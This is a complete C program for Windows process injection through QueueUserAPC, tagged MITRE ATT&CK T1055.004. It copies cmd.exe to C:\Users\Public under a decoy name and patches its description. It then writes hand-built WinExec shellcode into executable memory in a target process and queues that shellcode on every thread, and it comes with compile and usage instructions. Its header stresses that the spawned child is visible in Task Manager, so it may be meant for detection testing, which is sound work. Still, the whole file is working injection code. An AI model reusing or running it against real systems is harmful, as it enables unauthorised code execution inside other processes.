/*
 * APC Injection v2 — identifiable child in Task Manager
 *
 * Same spawn-renamed-cmd approach as classic_injection_v2.c, but delivered
 * via QueueUserAPC on every thread of the target. First thread to enter
 * alertable state fires the WinExec call.
 *
 * Task Manager under the host shows:
 *     RevShell-APC Inject   <-- big text
 *     RevShell_A.exe        <-- image name
 *
 * MITRE ATT&CK: T1055.004
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o apc_inject_v2.exe apc_injection_v2.c
 *   cl apc_injection_v2.c /Fe:apc_inject_v2.exe
 *
 * Usage:
 *   apc_inject_v2.exe <PID>
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define DECOY_PATH "C:\\Users\\Public\\RevShell_A.exe"
static const wchar_t* NEW_DESCRIPTION = L"RevShell-APC Inject";

static int patch_file_description(const char* path, const wchar_t* new_desc) {
    HANDLE h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(h, NULL);
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
    DWORD r = 0; ReadFile(h, buf, size, &r, NULL);
    const wchar_t* needle = L"Windows Command Processor";
    size_t nl = wcslen(needle) * 2, rl = wcslen(new_desc) * 2;
    int patched = 0;
    if (rl <= nl) {
        for (DWORD i = 0; i + nl <= size; ++i) {
            if (memcmp(buf + i, needle, nl) == 0) {
                memcpy(buf + i, new_desc, rl);
                for (size_t j = rl; j < nl; ++j) buf[i + j] = 0;
                patched = 1;
            }
        }
    }
    if (patched) { SetFilePointer(h, 0, NULL, FILE_BEGIN); DWORD w; WriteFile(h, buf, size, &w, NULL); }
    HeapFree(GetProcessHeap(), 0, buf);
    CloseHandle(h);
    return patched;
}

int main(int argc, char* argv[]) {
    if (argc < 2) { printf("Usage: %s <PID>\n", argv[0]); return 1; }
    DWORD pid = atoi(argv[1]);
    printf("[+] Target PID: %lu\n", pid);

    /* Pre-create renamed, patched cmd.exe */
    if (!CopyFileA("C:\\Windows\\System32\\cmd.exe", DECOY_PATH, FALSE)) {
        printf("[-] CopyFile failed (%lu)\n", GetLastError()); return 1;
    }
    patch_file_description(DECOY_PATH, NEW_DESCRIPTION);
    printf("[+] Decoy ready: %s\n", DECOY_PATH);

    /* Build shellcode: sub rsp,0x28; lea rcx,[rip+0x16]; mov edx,1;
     * mov rax,<WinExec>; call rax; add rsp,0x28; ret; <path>\0 */
    FARPROC winexec = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    size_t pathLen = strlen(DECOY_PATH) + 1;
    size_t scLen   = 33 + pathLen;
    unsigned char* sc = (unsigned char*)malloc(scLen);
    unsigned char prolog[33] = {
        0x48,0x83,0xEC,0x28,
        0x48,0x8D,0x0D, 0x16,0x00,0x00,0x00,
        0xBA,0x01,0x00,0x00,0x00,
        0x48,0xB8, 0,0,0,0,0,0,0,0,
        0xFF,0xD0,
        0x48,0x83,0xC4,0x28,
        0xC3
    };
    memcpy(prolog + 18, &winexec, 8);
    memcpy(sc, prolog, 33);
    memcpy(sc + 33, DECOY_PATH, pathLen);

    HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) { printf("[-] OpenProcess (%lu)\n", GetLastError()); free(sc); return 1; }

    LPVOID remote = VirtualAllocEx(hProc, NULL, scLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SIZE_T written = 0;
    WriteProcessMemory(hProc, remote, sc, scLen, &written);
    printf("[+] Shellcode @ %p (%zu bytes)\n", remote, written);
    free(sc);

    /* Queue APC on every thread of the target */
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(te) };
    int queued = 0;
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != pid) continue;
            HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (hT) {
                if (QueueUserAPC((PAPCFUNC)remote, hT, 0)) queued++;
                CloseHandle(hT);
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    printf("[+] APC queued on %d threads\n", queued);

    Sleep(3000);
    printf("[+] Done. Task Manager under host shows:\n");
    printf("    big text = \"RevShell-APC Inject\"\n");
    printf("    image    = \"RevShell_A.exe\"\n");
    CloseHandle(hProc);
    return 0;
}
